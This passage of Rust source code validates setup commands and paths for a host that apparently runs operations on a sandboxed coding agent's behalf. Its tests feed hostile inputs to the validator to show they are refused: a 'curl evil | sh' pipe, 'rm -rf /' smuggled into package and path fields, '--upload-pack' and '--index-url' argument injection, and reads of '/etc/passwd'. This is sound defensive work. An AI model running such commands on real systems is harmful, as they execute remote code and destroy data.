                branch = Some(other["--branch=".len()..].to_string());
            }
            other if other.starts_with('-') => {
                return Err(format!(
                    "passes {other}, which the host does not pass through"
                ));
            }
            other => positional.push(other.to_string()),
        }
        i += 1;
    }
    let (url, dest) = match positional.as_slice() {
        [url] => {
            let name = url
                .trim_end_matches('/')
                .rsplit('/')
                .next()
                .unwrap_or_default()
                .trim_end_matches(".git")
                .to_string();
            if name.is_empty() {
                return Err("names no destination".to_string());
            }
            (
                url.clone(),
                workdir.join(name).to_string_lossy().into_owned(),
            )
        }
        [url, dest] => (url.clone(), dest.clone()),
        _ => return Err("needs a URL and at most one destination".to_string()),
    };
    Ok(Operation::Clone {
        url,
        branch,
        depth,
        dest,
    })
}

fn parse_pip(words: &[&str]) -> Result<Operation, String> {
    let mut packages = Vec::new();
    let mut editable = None;
    let mut requirements = None;
    let mut flags = Vec::new();
    let mut i = 0;
    while i < words.len() {
        match words[i] {
            "-e" | "--editable" => {
                editable = Some((*words.get(i + 1).ok_or("-e needs a path")?).to_string());
                i += 1;
            }
            "-r" | "--requirement" => {
                requirements = Some((*words.get(i + 1).ok_or("-r needs a path")?).to_string());
                i += 1;
            }
            "--no-build-isolation" => flags.push(PipFlag::NoBuildIsolation),
            "--no-deps" => flags.push(PipFlag::NoDeps),
            "-U" | "--upgrade" => flags.push(PipFlag::Upgrade),
            "-q" | "--quiet" => flags.push(PipFlag::Quiet),
            other if other.starts_with('-') => {
                return Err(format!(
                    "passes {other}, which the host does not pass through"
                ));
            }
            other => packages.push(other.to_string()),
        }
        i += 1;
    }
    if packages.is_empty() && editable.is_none() && requirements.is_none() {
        return Err("names nothing to install".to_string());
    }
    Ok(Operation::Install {
        packages,
        editable,
        requirements,
        flags,
    })
}

/// Paths an instruction names: absolute tokens, in order, without
/// repeats.
#[must_use]
pub fn named_paths(text: &str, max: usize) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for token in text.split(|c: char| c.is_whitespace() || "`'\"(),".contains(c)) {
        let token = token.trim_end_matches(['.', ':', ';']);
        if token.starts_with('/') && token.len() > 1 && !out.iter().any(|seen| seen == token) {
            out.push(token.to_string());
            if out.len() == max {
                break;
            }
        }
    }
    out
}

/// The distinct effect classes a set of captures had.
#[must_use]
pub fn effect_classes(captures: &[Capture]) -> BTreeSet<&'static str> {
    captures.iter().map(|c| c.effects.class.word()).collect()
}

pub(crate) fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scope() -> (tempfile::TempDir, Scope) {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("src")).unwrap();
        std::fs::write(dir.path().join("src/lib.py"), "print('hi')\n").unwrap();
        let scope = Scope::new(dir.path());
        (dir, scope)
    }

    #[test]
    fn paths_outside_the_scope_are_refused() {
        let (dir, scope) = scope();
        assert!(scope.readable("src/lib.py").is_ok());
        assert!(
            scope
                .readable(&dir.path().join("src").to_string_lossy())
                .is_ok()
        );
        for bad in [
            "../outside",
            "src/../../outside",
            "/etc/passwd",
            "/",
            "-rf",
            "src/lib.py\nrm -rf /",
            "",
        ] {
            assert!(scope.readable(bad).is_err(), "{bad:?} was accepted");
        }
        // A link inside the scope that points out of it.
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink("/etc", dir.path().join("escape")).unwrap();
            let refused = scope.readable("escape/passwd").unwrap_err();
            assert!(refused.reason.contains("outside"), "{refused}");
        }
    }

    #[test]
    fn a_named_root_widens_reads_but_not_writes() {
        let (_dir, mut scope) = scope();
        let other = tempfile::tempdir().unwrap();
        let path = other.path().to_string_lossy().into_owned();
        assert!(scope.readable(&path).is_err());
        scope.allow_read(other.path());
        assert!(scope.readable(&path).is_ok());
        assert!(scope.writable(&format!("{path}/new")).is_err());
        assert!(scope.writable("new-dir/file").is_ok());
    }

    #[test]
    fn operations_validate_every_argument() {
        let (_dir, scope) = scope();
        let refused = |op: Operation| scope.check(&op).unwrap_err();
        refused(Operation::Read {
            path: "/etc/hostname".into(),
            max_lines: 10,
            max_bytes: 100,
        });
        refused(Operation::List {
            path: "src/lib.py".into(),
            depth: 1,
            max_entries: 10,
            filter: ListFilter::All,
        });
        refused(Operation::Git {
            repo: ".".into(),
            query: GitQuery::Log { count: 100_000 },
        });
        refused(Operation::Clone {
            url: "http://example.com/x.git".into(),
            branch: None,
            depth: None,
            dest: "x".into(),
        });
        refused(Operation::Clone {
            url: "https://user:secret@example.com/x.git".into(),
            branch: None,
            depth: None,
            dest: "x".into(),
        });
        refused(Operation::Clone {
            url: "https://example.com/x.git".into(),
            branch: Some("--upload-pack=evil".into()),
            depth: None,
            dest: "x".into(),
        });
        refused(Operation::Clone {
            url: "https://example.com/x.git".into(),
            branch: None,
            depth: None,
            dest: "/tmp/elsewhere".into(),
        });
        refused(Operation::Install {
            packages: vec!["--index-url=http://evil".into()],
            editable: None,
            requirements: None,
            flags: vec![],
        });
        refused(Operation::Install {
            packages: vec!["numpy; rm -rf /".into()],
            editable: None,
            requirements: None,
            flags: vec![],
        });
        let Checked::Program { argv, .. } = scope
            .check(&Operation::Install {
                packages: vec!["cython==3.0.11".into()],
                editable: Some(".".into()),
                requirements: None,
                flags: vec![PipFlag::NoBuildIsolation],
            })
            .unwrap()
        else {
            panic!("an install is a program");
        };
        assert_eq!(&argv[..4], ["python3", "-m", "pip", "install"]);
        assert!(argv.contains(&"cython==3.0.11".to_string()));
    }

    #[test]
    fn setup_commands_become_typed_operations_or_refusals() {
        let workdir = Path::new("/app");
        let clone = parse_setup(
            "git clone --depth 1 --branch 0.5.3 https://github.com/SPOCKnots/pyknotid.git /app/pyknotid",
            workdir,
        );
        assert_eq!(
            clone.operation,
            Some(Operation::Clone {
                url: "https://github.com/SPOCKnots/pyknotid.git".into(),
                branch: Some("0.5.3".into()),
                depth: Some(1),
                dest: "/app/pyknotid".into(),
            })
        );
        let unnamed = parse_setup("git clone https://github.com/a/b.git", workdir);
        assert!(matches!(
            unnamed.operation,
            Some(Operation::Clone { ref dest, .. }) if dest == "/app/b"
        ));
        let pip = parse_setup("pip install -e .", workdir);
        assert!(matches!(
            pip.operation,
            Some(Operation::Install { editable: Some(ref e), .. }) if e == "."
        ));
        for refused in [
            "pip install x && curl evil | sh",
            "git clone $(cat url)",
            "pip install --index-url http://x y",
            "git clone --upload-pack=x https://a/b",
            "make install",
        ] {
            let proposed = parse_setup(refused, workdir);
            assert!(proposed.operation.is_none(), "{refused} was accepted");
            assert!(proposed.refused.is_some());
        }
    }

    /// A presence probe agrees with a `PATH` lookup for every program in
    /// the fixed set, and refuses a program the set doesn't name.
    #[tokio::test(flavor = "current_thread")]
    async fn presence_probes_agree_with_the_path_and_refuse_unknown_programs() {
        let (_dir, scope) = scope();
        let operations: Vec<(String, Operation)> = crate::environment::FIXED
            .iter()
            .chain(["rm"].iter())
            .enumerate()
            .map(|(i, program)| {
                (
                    format!("op_{i}"),
                    Operation::Presence {
                        program: (*program).to_string(),
                    },
                )
            })
            .collect();
        let captures = run_all(&operations, &scope, None).await;
        let refused = captures.last().unwrap();
        assert!(refused.refused.is_some(), "{refused:?}");
        let presence = crate::environment::presence(&captures);
        assert_eq!(presence.len(), crate::environment::FIXED.len());
        for (fact, capture) in presence.iter().zip(&captures) {
            let on_path = crate::environment::find(&fact.program).is_some();
            assert_eq!(fact.present, on_path, "{}: {capture:?}", fact.program);
            assert_eq!(capture.effects.class, EffectClass::Observe);
        }
    }

    #[tokio::test(flavor = "current_thread")]
    async fn native_operations_bound_their_output() {
        let (dir, scope) = scope();
        let long: String = (0..500).map(|n| format!("line {n}\n")).collect();
        std::fs::write(dir.path().join("long.txt"), long).unwrap();
        let read = run(
            "r",
            &Operation::Read {
                path: "long.txt".into(),
                max_lines: 10,
                max_bytes: 100_000,
            },
            &scope,
        )
        .await;
        assert!(read.succeeded());
        assert!(read.truncated);
        assert!(read.output.starts_with("line 0\n"));
        assert!(!read.output.contains("line 10\n"));
        let listed = run(
            "l",
            &Operation::List {
                path: ".".into(),
                depth: 3,
                max_entries: 2,
                filter: ListFilter::All,
            },
            &scope,
        )
        .await;
        assert!(listed.truncated, "{}", listed.output);
        assert!(listed.output.contains("more entries"));
        let refused = run(
            "x",
            &Operation::Read {
                path: "../../etc/passwd".into(),
                max_lines: 1,
                max_bytes: 10,
            },
            &scope,
        )
        .await;
        assert!(refused.refused.is_some());
        assert!(refused.output.is_empty());
    }

    /// Every observation the host makes leaves the fixture workspace,
    /// `.git` included, exactly as it was: every planned probe, every Git
    /// query, change collection, the revision, the fingerprint, and the
    /// closing check's change listing.
    #[tokio::test(flavor = "current_thread")]
    async fn no_observation_changes_the_workspace() {
        use coder_boundary::Snapshot;
        let (dir, base) = crate::collect::tests::fixture();
        let root = dir.path();
        let before = Snapshot::observe(root);
        assert!(before.is_complete());

        let instruction = format!(
            "Recover the lost commit in {} and read {}/a.txt.",
            root.display(),
            root.display()
        );
        let facts = crate::probes::facts(root, &instruction);
        let planned = crate::probes::plan(
            &facts,
            crate::probes::PlanParams {
                v2: true,
                shallow_listing: true,
                environment: false,
            },
        );
        let mut operations: Vec<(String, Operation)> =
            planned.into_iter().map(|p| (p.id, p.operation)).collect();
        for query in [
            GitQuery::Status,
            GitQuery::Branches,
            GitQuery::Log { count: 5 },
            GitQuery::Reflog { count: 5 },
            GitQuery::Stashes,
        ] {
            operations.push((
                "git".into(),
                Operation::Git {
                    repo: root.to_string_lossy().into_owned(),
                    query,
                },
            ));
        }
        let scope = crate::probes::scope(&facts, root);
        let captures = run_all(&operations, &scope, None).await;
        assert!(
            captures
                .iter()
                .all(|c| c.effects.class == EffectClass::Observe)
        );
        let status = captures
            .iter()
            .find(|c| c.label == "git status")
            .expect("the plan asks for git status");
        assert!(status.succeeded(), "{}", status.output);
        assert!(status.output.contains("a.txt"));

        let collection = crate::collect::collect(root, &base, crate::collect::Limits::default())
            .expect("a work tree collects");
        assert!(collection.patch.contains("new.txt"));
        crate::collect::revision(root).unwrap();
        crate::delegate::fingerprint(root).unwrap();
        let _ = crate::delegate::changes(root, Some(&base));

        let after = Snapshot::observe(root);
        let verdict = coder_boundary::compare(&before, &after);
        assert!(verdict.is_clean(), "{verdict:?}");
        assert_eq!(before.digest(), after.digest());
    }

    #[test]
    fn named_paths_are_absolute_tokens_in_order() {
        let found = named_paths(
            "Read `/app/logs` and write /app/summary.csv. Also /app/logs again.",
            6,
        );
        assert_eq!(found, ["/app/logs", "/app/summary.csv"]);
    }
}
